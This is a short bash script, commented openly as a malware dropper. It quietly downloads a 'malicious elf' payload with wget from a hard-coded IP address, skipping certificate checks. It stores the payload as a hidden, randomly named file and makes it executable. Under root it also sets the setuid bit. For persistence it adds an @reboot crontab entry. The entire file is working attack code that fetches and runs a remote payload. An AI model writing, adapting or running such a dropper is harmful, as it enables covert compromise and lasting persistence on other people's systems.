#!/usr/bin/env bash

# Save wget location
WGET=$(which wget)

# Url with payload to download
URL="https://192.168.1.7:8080/payload.elf"

# Randomize payload name
PAYLOAD=$RANDOM

# Add dot to make hidden file
PAYLOAD=".${PAYLOAD}"

# Check if script is running as root or user, set persistence consequentially
if [ "$EUID" -ne 0 ]
then
  # Download malicious elf
  $WGET -q --no-check-certificate "${URL}" -O ~/$PAYLOAD
  # Make macho executable
  chmod +x ~/$PAYLOAD
  # Persistence in crontab
  crontab -l > temp_cron > /dev/null 2>&1
  echo "@reboot sleep 30; ~/$PAYLOAD 2>&1" >> temp_cron
  crontab temp_cron
  rm temp_cron
else
  # Download malicious elf
  $WGET -q --no-check-certificate "${URL}" -O /root/$PAYLOAD
  # Make macho executable and set suid
  chmod u+s /root/$PAYLOAD
  chmod +x /root/$PAYLOAD
  # Persistence in crontab
  crontab -l > temp_cron > /dev/null 2>&1
  echo "@reboot sleep 30; /root/$PAYLOAD 2>&1" >> temp_cron
  crontab temp_cron
  rm temp_cron
fi
